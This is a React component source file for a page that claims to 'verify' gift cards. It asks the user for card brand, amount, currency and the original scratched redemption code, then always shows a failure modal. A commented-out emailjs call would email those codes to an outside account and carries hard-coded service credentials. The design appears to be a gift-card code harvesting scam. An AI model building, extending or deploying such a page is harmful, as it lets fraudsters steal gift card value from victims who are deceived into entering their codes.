import React, { useRef, useState } from 'react'
import veriImg from "../images/gig1.b5f9534b.webp"
import "./verification.css"
import { RiErrorWarningFill } from "react-icons/ri";
// import emailjs from 'emailjs-com';
import FailedModal from './FailedModal';
const Verificatio = () => {
  const amountRef=useRef()
  const cardtypeRef=useRef()
  const currencyRef=useRef()
  const redemptionRef=useRef()
  const overlay=useRef()

  const [modalDisplay,setModaldisplay]=useState(false)
  const [carddetails,setCarddetails]=useState({cardName:'',cardAmount:'',CardCurrency:'',closemodal:''})
  const closemodal=()=>{
    overlay.current.style.display='none'
      amountRef.current.value=''
      redemptionRef.current.value=''
      cardtypeRef.current.value=''
    setModaldisplay(false)
  }
  
  const submitCardDetails=(e)=>{
  let amountval=amountRef.current.value
  let cardtypval=cardtypeRef.current.value
  let currencyval=currencyRef.current.value
  let redemptionval=redemptionRef.current.value
    e.preventDefault()
    
    if(amountval && cardtypval && currencyval && redemptionval){
      setCarddetails({...carddetails, cardName:cardtypval,cardAmount:amountval,CardCurrency:currencyval,closemodal:closemodal})
      overlay.current.style.display='block'
      setModaldisplay(true)
      console.log(modalDisplay)
      

      // const message={name:'cardlidity',email:"",message:` ${amountval},\n${cardtypval},\n${currencyval},\n${redemptionval}`}
      // // console.log(amountval,cardtypval,currencyval,redemptionval)
      // emailjs.send(
      //   'service_g3pmhwu',    // Service ID
      //   'template_mph9yla',   // Template ID
      //   message,             // Template parameters
      //   'pDNCarIDNNCtYjtx8'        // User ID
      // )
      // .then((response) => {
      //   console.log('SUCCESS!', response.status, response.text);
      //   alert('Email sent successfully!');
      // })
      // .catch((err) => {
      //   console.error('FAILED...', err);
      //   alert('Failed to send email. Please try again later.');
      // });
    }
   
  }
  const [selectedOption, setSelectedOption] = useState('');
  const handleChange = (event) => {
    setSelectedOption(event.target.value);
  };

  return (
    <section className='veriContainer'>
      {modalDisplay? <FailedModal carddetails={carddetails}/>:''}
      <div className="leftveri">
        <img src={veriImg} alt="" className='verimg' />
      </div>
      <div className="rightveri">
        <form onSubmit={submitCardDetails}>
        <select id="choices" name="choices" ref={cardtypeRef} required value={selectedOption} onChange={handleChange} className='cardselect'>
        <option value="" disabled >Select type of card</option>
          <option value="Apple">Apple</option>
          <option value="eBay">eBay</option>
          <option value="Steam">Steam</option>
          <option value="Amazon">Amazon</option>
          <option value="Xbox">Xbox</option>
          <option value="Googleplay">Googleplay</option>
          <option value="Playstation">Playstation</option>
          <option value="Sephora">Sephora</option>
          <option value="NordStorm">NordStorm</option>
          <option value="Nike">Nike</option>
          <option value="Mastercard">Mastercard</option>
          <option value="Vanilla">Vanilla</option>
          <option value="WalmartCard">WalmartCard</option>
          <option value="Perfect Visa">Perfect Visa</option>
          <option value="Visa Silvery White">Visa Silvery White</option>
          <option value="TT Visa">TT Visa</option>
          <option value="Amex">Amex</option>
      </select>
      <div className='sect2'>
      <select id="choices" name="choices" required ref={currencyRef} className='selectcurrency '>
          <option value="USD">USD</option>
          <option value="GBP">GBP</option>
          <option value="AUD">AUD</option>
          <option value="EUR">EUR</option>
          <option value="CAD">CAD</option>
      </select>
      <input type="Number" placeholder='Card Amount' required className='amount' ref={amountRef} />
      </div>
      <input type="text" name="" id="" placeholder='Redemption code' required ref={redemptionRef} className='redemptio'/>
      <p className='warningp'> <RiErrorWarningFill className='warning'/> Please make sure the redemption code is the original scratched code</p>
        <button type='submit' className='verifyCard'>Verify Card</button>
        <p>Please make sure the codes you are about to input are correct and according to details</p>
        </form>
      </div>
      <div ref={overlay} className="overlay"></div>
    </section>
  )
}

export default Verificatio